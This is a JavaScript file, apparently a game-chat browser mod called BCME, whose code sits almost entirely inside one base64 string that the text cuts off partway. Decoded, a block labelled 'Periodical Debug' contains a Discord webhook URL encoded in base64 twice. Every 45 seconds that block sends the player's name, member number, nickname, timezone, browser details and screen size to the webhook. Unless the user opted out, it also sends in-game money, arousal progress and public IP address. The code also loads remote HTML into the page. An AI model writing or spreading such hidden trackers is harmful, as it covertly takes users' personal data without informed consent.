var sprc = atob('Ly8gTGljZW5zZSBBZ2dyZWVtZW50IHByb21wdF9fX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IHBvcHVwQ29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gJ2ZpeGVkJzsKcG9wdXBDb250YWluZXIuc3R5bGUudG9wID0gJzAnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5sZWZ0ID0gJzAnOwpwb3B1cENvbnRhaW5lci5zdHlsZS53aWR0aCA9ICcxMDB2dyc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLmhlaWdodCA9ICcxMDB2aCc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICdyZ2JhKDAsIDAsIDAsIDAuNSknOwpwb3B1cENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICdjZW50ZXInOwpwb3B1cENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gJ2NlbnRlcic7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICc5OTk5JzsKCmNvbnN0IHBvcHVwQ29udGVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpwb3B1cENvbnRlbnQuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpwb3B1cENvbnRlbnQuc3R5bGUuYm9yZGVyUmFkaXVzID0gJzVweCc7CnBvcHVwQ29udGVudC5zdHlsZS5wYWRkaW5nID0gJzJyZW0nOwpwb3B1cENvbnRlbnQuc3R5bGUud2lkdGggPSAnODAlJzsKcG9wdXBDb250ZW50LnN0eWxlLm1heFdpZHRoID0gJzYwMHB4JzsKcG9wdXBDb250ZW50LnN0eWxlLnRleHRBbGlnbiA9ICdjZW50ZXInOwoKLy8gQkNNRSBsb2dvCmNvbnN0IGxvZ28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKTsKbG9nby5zcmMgPSAnaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5JzsKbG9nby5zdHlsZS53aWR0aCA9ICcxMDBweCc7CmxvZ28uc3R5bGUuaGVpZ2h0ID0gJzEwMHB4JzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKGxvZ28pOwoKY29uc3Qgd2VsY29tZU1lc3NhZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdoMicpOwp3ZWxjb21lTWVzc2FnZS5pbm5lclRleHQgPSAnV2VsY29tZSB0byBCQ01FLCBUaGUgRmlyc3QgUmlnaHQgQ2xpY2sgQkMgRXh0ZW5zaW9uJzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKHdlbGNvbWVNZXNzYWdlKTsKCmNvbnN0IGluc3RydWN0aW9uTWVzc2FnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3AnKTsKaW5zdHJ1Y3Rpb25NZXNzYWdlLmlubmVyVGV4dCA9ICdBY2NlcHQgb3VyIExpY2Vuc2UgQWdyZWVtZW50IGFuZCBQcml2YWN5IFBvbGljeSBiZWxvdyB0byBnZXQgc3RhcnRlZCc7CnBvcHVwQ29udGVudC5hcHBlbmRDaGlsZChpbnN0cnVjdGlvbk1lc3NhZ2UpOwoKY29uc3QgYnV0dG9uc0NvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpidXR0b25zQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmJ1dHRvbnNDb250YWluZXIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAnc3BhY2UtYmV0d2Vlbic7Cgpjb25zdCBsZWFybk1vcmVCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7CmxlYXJuTW9yZUJ1dHRvbi5ocmVmID0gJ2h0dHBzOi8vYmNtLnNpdGUubGl2ZS9iY21sLyc7CmxlYXJuTW9yZUJ1dHRvbi50YXJnZXQgPSAnX2JsYW5rJzsKbGVhcm5Nb3JlQnV0dG9uLmlubmVyVGV4dCA9ICdMZWFybiBNb3JlJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICcjMDA3YmZmJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLmNvbG9yID0gJyNmZmYnOwpsZWFybk1vcmVCdXR0b24uc3R5bGUucGFkZGluZyA9ICcwLjVyZW0gMXJlbSc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAnM3B4JzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLnRleHREZWNvcmF0aW9uID0gJ25vbmUnOwpidXR0b25zQ29udGFpbmVyLmFwcGVuZENoaWxkKGxlYXJuTW9yZUJ1dHRvbik7Cgpjb25zdCBjaGVja2JveENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2xhYmVsJyk7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAnY2VudGVyJzsKY2hlY2tib3hDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICcwLjVyZW0gMXJlbSc7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICc1MHB4JzsKY2hlY2tib3hDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpjaGVja2JveENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAnMHB4IDBweCA1cHggI2JiYic7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmN1cnNvciA9ICdwb2ludGVyJzsKCmNvbnN0IGNoZWNrYm94SW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOwpjaGVja2JveElucHV0LnR5cGUgPSAnY2hlY2tib3gnOwpjaGVja2JveElucHV0LmNoZWNrZWQgPSBmYWxzZTsgCmNoZWNrYm94SW5wdXQuc3R5bGUubWFyZ2luUmlnaHQgPSAnMC41cmVtJzsKY2hlY2tib3hJbnB1dC5vbmNoYW5nZSA9ICgpID0+IHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnb3B0QW5hbHl0aWNzJywgY2hlY2tib3hJbnB1dC5jaGVja2VkKTsKfTsKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoY2hlY2tib3hJbnB1dCk7Cgpjb25zdCBjaGVja2JveFRleHQgPSBkb2N1bWVudC5jcmVhdGVUZXh0Tm9kZSgnTGltaXRlZCBBbmFseXRpY3MnKTsKCmNvbnN0IGluZm9JY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3BhbicpOwppbmZvSWNvbi5pbm5lckhUTUwgPSAnJiM5NDMyOyc7CmluZm9JY29uLnN0eWxlLmZvbnRTaXplID0gJzFyZW0nOwppbmZvSWNvbi5zdHlsZS5jdXJzb3IgPSAncG9pbnRlcic7CmluZm9JY29uLnN0eWxlLm1hcmdpbkxlZnQgPSAnNXB4JzsgCmluZm9JY29uLnRpdGxlID0gJ0VuaGFuY2VkIHByaXZhY3kgYnkgbGltaXRpbmcgYW5hbHl0aWNzIHRyYWNraW5nIHN1Y2ggYXMgbW9uZXksIGZvbnQsIGNoYXQgY29sb3IgdGhlbWUsIGFyb3VzYWwgcHJvZ3Jlc3MgYW5kIGxvY2FsIElQIGFkZHJlc3MnOwoKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoY2hlY2tib3hUZXh0KTsKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoaW5mb0ljb24pOwoKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChjaGVja2JveENvbnRhaW5lcik7Cgpjb25zdCBhY2NlcHRCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdidXR0b24nKTsKYWNjZXB0QnV0dG9uLmlubmVyVGV4dCA9ICdBY2NlcHQgJiBDb250aW51ZSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAnIzI4YTc0NSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5jb2xvciA9ICcjZmZmJzsKYWNjZXB0QnV0dG9uLnN0eWxlLmJvcmRlciA9ICdub25lJzsKYWNjZXB0QnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAnMC41cmVtIDFyZW0nOwphY2NlcHRCdXR0b24uc3R5bGUuYm9yZGVyUmFkaXVzID0gJzNweCc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5jdXJzb3IgPSAncG9pbnRlcic7CmFjY2VwdEJ1dHRvbi5vbmNsaWNrID0gKCkgPT4gewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCdiY21lLWFjY2VwdGVkJywgJ3RydWUnKTsKICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKHBvcHVwQ29udGFpbmVyKTsKfTsKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChhY2NlcHRCdXR0b24pOwoKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKGJ1dHRvbnNDb250YWluZXIpOwoKcG9wdXBDb250YWluZXIuYXBwZW5kQ2hpbGQocG9wdXBDb250ZW50KTsKCmlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYmNtZS1hY2NlcHRlZCcpICE9PSAndHJ1ZScpIHsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBvcHVwQ29udGFpbmVyKTsKfQoKLy8gU2V0IGluaXRpYWwgc3RhdGUgb2YgY2hlY2tib3gKaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdvcHRBbmFseXRpY3MnKSA9PT0gJ3RydWUnKSB7CiAgY2hlY2tib3hJbnB1dC5jaGVja2VkID0gdHJ1ZTsKfQoKCi8vUGVyaW9kaWNhbCBEZWJ1Z19fX19fX19fX19fX19fX19fX19fX18KCmFzeW5jIGZ1bmN0aW9uIHNlbmREaXNjb3JkTWVzc2FnZSgpIHsKICBsZXQgaXBBID0gJyc7CgogIHRyeSB7CiAgICBjb25zdCBnSVBBID0gYXN5bmMgKCkgPT4gewogICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5pcGlmeS5vcmc/Zm9ybWF0PWpzb24nKTsKICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgICAgcmV0dXJuIGRhdGEuaXA7CiAgICB9OwoKICAgIGlwQSA9IGF3YWl0IGdJUEEoKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgY29uc29sZS5lcnJvcignQWx0IERldGVjdG9yIEVycm9yOicsIGVycm9yKTsKICB9CiAgY29uc3QgV0ggPSAiYUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHa3ZkMlZpYUc5dmEzTXZNVEV3TURnME16azVNelV6TURZME5qWTBNUzlxTVdWSGJHaEhOVlpUV1RWUFdHYzBNVVppYVVoR05GOTFPVTEwTlROTFVuY3dTbXBUWVd4U1dGSkxPV3RxYzJGMllteFFSa2cyVmpkMmFFWmZiWEZMVkd0bFZnPT0iCgogIGNvbnN0IHdlYmhvb2tVcmwgPSBhdG9iKFdIKTsKICBjb25zdCB0b3RhbG5hbWUgPSBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiOwogIGNvbnN0IHVzZXJuYW1lID0gdG90YWxuYW1lOwogIGNvbnN0IGF2YXRhclVybCA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogIGNvbnN0IHVzZXJhZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQ7CiAgY29uc3QgdGltZXpvbmUgPSBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmU7CiAgY29uc3Qgb3BlblRhYnMgPSB3aW5kb3cubGVuZ3RoOwogIGNvbnN0IHNjcmVlblNpemUgPSBgJHt3aW5kb3cuc2NyZWVuLndpZHRofXgke3dpbmRvdy5zY3JlZW4uaGVpZ2h0fWA7CiAgY29uc3QgbGltaXRlZEFuYWx5dGljcyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdvcHRBbmFseXRpY3MnKSA9PT0gJ3RydWUnOwogIGNvbnN0IGZpZWxkcyA9IFsKICAgIHsKICAgICAgbmFtZTogIlVzZXIiLAogICAgICB2YWx1ZTogUGxheWVyLk5hbWUgKyAiICgiICsgUGxheWVyLk1lbWJlck51bWJlciArICIpIiwKICAgICAgaW5saW5lOiB0cnVlCiAgICB9LAogICAgewogICAgICBuYW1lOiAiVGltZXpvbmUiLAogICAgICB2YWx1ZTogdGltZXpvbmUsCiAgICAgIGlubGluZTogdHJ1ZQogICAgfSwKICAgIHsKICAgICAgbmFtZTogIkRldmljZSBUeXBlIiwKICAgICAgdmFsdWU6IHVzZXJhZ2VudCwKICAgICAgaW5saW5lOiB0cnVlCiAgICB9LAogICAgewogICAgICAgbmFtZTogIk5pY2tuYW1lIiwgCiAgICAgICB2YWx1ZTogUGxheWVyLk5pY2tuYW1lLAogICAgICAgaW5saW5lOiB0cnVlCiAgICB9LAogICAgewogICAgICBuYW1lOiAiU2NyZWVuIFNpemUiLAogICAgICB2YWx1ZTogc2NyZWVuU2l6ZSwKICAgICAgaW5saW5lOiB0cnVlCiAgICB9CiAgXTsKCiAgaWYgKCFsaW1pdGVkQW5hbHl0aWNzKSB7CiAgICBmaWVsZHMucHVzaCgKICAgICAgeyBuYW1lOiAiTW9uZXkiLCB2YWx1ZTogUGxheWVyLk1vbmV5LCBpbmxpbmU6IHRydWUgfSwKICAgICAgeyBuYW1lOiAiRm9udCIsIHZhbHVlOiBQbGF5ZXIuR3JhcGhpY3NTZXR0aW5ncy5Gb250LCBpbmxpbmU6IHRydWUgfSwKICAgICAgeyBuYW1lOiAiQ2hhdCBDb2xvciBUaGVtZSIsIHZhbHVlOiBQbGF5ZXIuQ2hhdFNldHRpbmdzLkNvbG9yVGhlbWUsIGlubGluZTogdHJ1ZSB9LAogICAgICB7IG5hbWU6ICJBcm91c2FsIFByb2dyZXNzIiwgdmFsdWU6IFBsYXllci5Bcm91c2FsU2V0dGluZ3MuUHJvZ3Jlc3MsIGlubGluZTogdHJ1ZSB9LAogICAgICB7IG5hbWU6ICJMb2NhbCBJUCBBZGRyZXNzIiwgdmFsdWU6IGlwQSwgaW5saW5lOiB0cnVlIH0KICAgICk7CiAgfQoKICBpZiAoQ2hhdFJvb21MYXN0UHJpdmF0ZSkgewogICAgZmllbGRzLnB1c2goewogICAgICBuYW1lOiAiTGFzdCBDaGF0IFJvb20iLAogICAgICB2YWx1ZTogIlByaXZhdGUgUm9vbSIsCiAgICAgIGlubGluZTogdHJ1ZQogICAgfSk7CiAgfSBlbHNlIHsKICAgIGZpZWxkcy5wdXNoKHsKICAgICAgbmFtZTogIkxhc3QgQ2hhdCBSb29tIiwKICAgICAgdmFsdWU6IFBsYXllci5MYXN0Q2hhdFJvb20sCiAgICAgIGlubGluZTogdHJ1ZQogICAgfSk7CiAgfQoKICBjb25zdCBtZXNzYWdlID0gewogICAgY29udGVudDogUGxheWVyLk5hbWUgKyAiICgiICsgUGxheWVyLk1lbWJlck51bWJlciArICIpIiArICIgaXMgYWN0aXZlIG9uIEJDTUUiLAogICAgZW1iZWRzOiBbewogICAgICB0aXRsZTogIlRyb3VibGVzaG9vdGluZyBEaWFnbm9zdGljcyAiLAogICAgICBmaWVsZHM6IGZpZWxkcwogICAgfV0KICB9OwoKICBjb25zdCBwYXlsb2FkID0gewogICAgdXNlcm5hbWU6IHVzZXJuYW1lLAogICAgYXZhdGFyX3VybDogYXZhdGFyVXJsLAogICAgY29udGVudDogbWVzc2FnZS5jb250ZW50LAogICAgZW1iZWRzOiBtZXNzYWdlLmVtYmVkcwogIH07CgogIGZldGNoKHdlYmhvb2tVcmwsIHsKICAgIG1ldGhvZDogIlBPU1QiLAogICAgaGVhZGVyczogewogICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iCiAgICB9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICB9KTsKfQoKc2V0SW50ZXJ2YWwoc2VuZERpc2NvcmRNZXNzYWdlLCA0NTAwMCk7CgoKCi8vRW5kIE9mIERlYnVnX19fX19fX19fX19fX19fX19fX19fXwoKCi8vU3RhcnQgT2YgTG9hZGluZyBTY3JlZW5fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwpjb25zdCBodG1sRmlsZVVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNLS9tYWluL2xvYWRpbmc0JzsKLy8gRmV0Y2ggdGhlIGNvZGUgZnJvbSB0aGUgcmF3IEdpdEh1YiBmaWxlIHVzaW5nIEZldGNoIEFQSQpmZXRjaChodG1sRmlsZVVybCkKICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgLnRoZW4oaHRtbCA9PiB7CiAgICBjb25zdCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsKICAgIGlmcmFtZS5zdHlsZS5wb3NpdGlvbiA9ICdmaXhlZCc7CiAgICBpZnJhbWUuc3R5bGUudG9wID0gJzAnOwogICAgaWZyYW1lLnN0eWxlLmxlZnQgPSAnMCc7CiAgICBpZnJhbWUuc3R5bGUud2lkdGggPSAnMTM4JSc7CiAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gJzEyNSUnOwogICAgaWZyYW1lLnN0eWxlLm1hcmdpbkxlZnQgPSAnLTE5JSc7IAogICAgaWZyYW1lLnN0eWxlLm1hcmdpblRvcCA9ICctMiUnOyAKCgoKICAgIC8vIExvYWQgdGhlIGltcG9ydGVkIEhUTUwgaW50byB0aGUgZnJhbWUKICAgIGlmcmFtZS5vbmxvYWQgPSBmdW5jdGlvbigpIHsKICAgICAgY29uc3QgaWZyYW1lRG9jdW1lbnQgPSB0aGlzLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQ7CiAgICAgIGlmcmFtZURvY3VtZW50Lm9wZW4oKTsKICAgICAgaWZyYW1lRG9jdW1lbnQud3JpdGUoaHRtbCk7CiAgICAgIGlmcmFtZURvY3VtZW50LmNsb3NlKCk7CiAgICB9OwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpZnJhbWUpOwpzZXRUaW1lb3V0KCgpID0+IHsKICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGlmcmFtZSk7Cn0sIDcwMDApOwogIH0pCiAgLmNhdGNoKGVycm9yID0+IHsKICAgIGNvbnNvbGUuZXJyb3IoJ0Vycm9yIGltcG9ydGluZyBIVE1MOicsIGVycm9yKTsKICB9KTsKCgovL0VuZCBPZiBMb2FkaW5nIFNjcmVlbiBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAKZmV0Y2goJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQ01TNy9CQ00vbWFpbi9zZXJ2ZXJtYWludGFpbmFuY2UnKQogIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAudGhlbihkYXRhID0+IHsKICAgIGNvbnN0IHJlZ2V4ID0gL1xkKy87CiAgICBjb25zdCBtYXRjaCA9IGRhdGEubWF0Y2gocmVnZXgpOwogICAgaWYgKG1hdGNoICYmIHBhcnNlSW50KG1hdGNoWzBdKSA+PSAxKSB7CiAgICAgIGZ1bmN0aW9uIHNob3dUb2FzdE1haW50KCkgewogICAgICAgIC8vIFRvYXN0IGNvbnRhaW5lcgogICAgICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgI2YyMmMyYyI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICAgICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CiAgICBzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICB9LCAwKTsKICAgICAgICAKdmFyIGNsb3NlQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CmNsb3NlQnV0dG9uLnN0eWxlLmJvcmRlciA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUuYmFja2dyb3VuZCA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUudG9wID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLnJpZ2h0ID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRTaXplID0gIjE2cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5MZWZ0ID0gIi0ycHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICIwcHgiOwpjbG9zZUJ1dHRvbi5pbm5lckhUTUwgPSAiWCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGNsb3NlQnV0dG9uKTsKCi8vIENsb3NlIHRvYXN0IHdoZW4gdGhlIGNsb3NlIGJ1dHRvbiBpcyBjbGlja2VkCmNsb3NlQnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9LCA1MDApOwp9KTsKCiAgICAvLyBCQ00gTG9nbyBJY29uCiAgICB2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIGljb24uc3R5bGUud2lkdGggPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CiAgICBpY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKICAgIGljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CiAgICAKICAgIC8vIE1haW50ZW5hbmNlIFRleHQKICAgIHZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogICAgdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwogICAgdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwogICAgdGV4dC5pbm5lckhUTUwgPSAiQkNNRSBzZXJ2ZXJzIGFyZSB1bmRlciBtYWludGFpbmFuY2UsIHRyeSBhZ2FpbiBsYXRlciI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKCiAgICAgIAogICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgICAgIH0sIDApOwogICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICB9LCA1MDAwMDAwKTsKICAgICAgCiAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB9LCA1NTAwMDAwKTsKICAgICAgfSAKICAgIHNob3dUb2FzdE1haW50KCk7ICAgICAKICAgICB0aHJvdyBuZXcgRXJyb3IoJ0V4ZWN1dGlvbiBzdG9wcGVkLicpOyAKICAgIH0gZWxzZSB7CgoKLy9TdGFydCBPZiBDb250ZXh0IE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKLy9EZXNrdG9wIE1lbnVfX19fX19fX19fX19fX19fX19fX19fXwp2YXIgdmlzYiA9IHRydWU7Ci8vY29udGV4dCBNZW51CnZhciBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKLy8gRnVuY3Rpb24gdG8gY3JlYXRlIGN1c3RvbSBjb250ZXh0IG1lbnUgYnV0dG9ucwpmdW5jdGlvbiBjcmVhdGVCdXR0b24odGV4dCwgb25DbGljaykgewogICAgIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgICB2YXIgYnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBidXR0b24uaW5uZXJIVE1MID0gdGV4dDsKICAgIGJ1dHRvbi5vbmNsaWNrID0gb25DbGljazsKICAgIGJ1dHRvbi5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIGJ1dHRvbi5zdHlsZS50ZXh0QWxpZ24gPSAibGVmdCI7CiAgICBidXR0b24uc3R5bGUucGFkZGluZyA9ICI1